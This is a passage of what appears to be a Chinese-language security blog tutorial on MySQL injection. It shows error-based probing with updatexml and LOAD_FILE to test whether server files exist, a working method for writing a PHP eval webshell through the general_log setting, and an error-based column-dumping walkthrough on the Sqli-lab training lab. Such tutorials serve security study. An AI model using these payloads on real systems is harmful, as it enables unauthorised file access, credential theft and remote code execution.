<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~0~'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="s1">''</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="nf">isnull</span><span class="p">(</span><span class="nf">LOAD_FILE</span><span class="p">(</span><span class="s1">'/var/lib/mysql-files/1.php'</span><span class="p">)),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~1~'</span>
</pre></div>
<p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p>
<p><strong>另类写读文件</strong></p>
<p><strong>dumpfile</strong> 官方文档如下：</p>
<p><a href="https://imgchr.com/i/Zmk139" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/Zmk139.md.png"/></a></p>
<p><strong>危险变量导致getshell</strong></p>
<p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p>
<div class="highlight"><pre><span></span><span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%general%'</span><span class="p">;</span> <span class="err">查看配置信息</span>

<span class="kt">set</span> <span class="n">global</span> <span class="n">general_log</span><span class="o">=</span><span class="k">on</span> <span class="err">开启</span><span class="n">general</span> <span class="n">log模式</span>

<span class="kt">set</span> <span class="n">global</span> <span class="n">general_log_file</span><span class="o">=</span><span class="s1">'F:\\phpstudy\\www\\shell.php'</span><span class="p">;</span>

<span class="k">select</span> <span class="s1">'&lt;?php eval($_POST['</span><span class="n">pwd</span><span class="s1">']);?&gt;'</span><span class="p">;</span>
</pre></div>
<p>最终<code>shell.php</code>为我们的<code>webshell</code></p>
<p><a href="https://imgchr.com/i/ZmGHSI" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png"/></a></p>
<h3 data-content="1" id="36dd5a36e35f747729c4277176117bf2">组合拳思考</h3>
<p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p>
<p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p>
<p>以<code>Sqli-lab less-1</code>为例</p>
<p>首先通过<code>polygon</code>函数进行报错</p>
<p><a href="https://imgchr.com/i/Zmuiy4" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png"/></a></p>
<p>接着通过列重复来报错</p>
<p><a href="https://imgchr.com/i/ZmK8vF" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png"/></a></p>
<p><a href="https://imgchr.com/i/ZmKyKe" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png"/></a></p>
<p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p>
<p><a href="https://imgchr.com/i/ZmMzFI" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png"/></a></p>
<p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p>
<h3 data-content="1" id="82608ec6e527886f20a92058f4401743">参考资料</h3>
<p><a href="https://xz.aliyun.com/t/2460" target="_blank">https://xz.aliyun.com/t/2460</a></p>
<p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
<p><a href="https://xz.aliyun.com/t/253" target="_blank">https://xz.aliyun.com/t/253</a></p>
</div>
</div>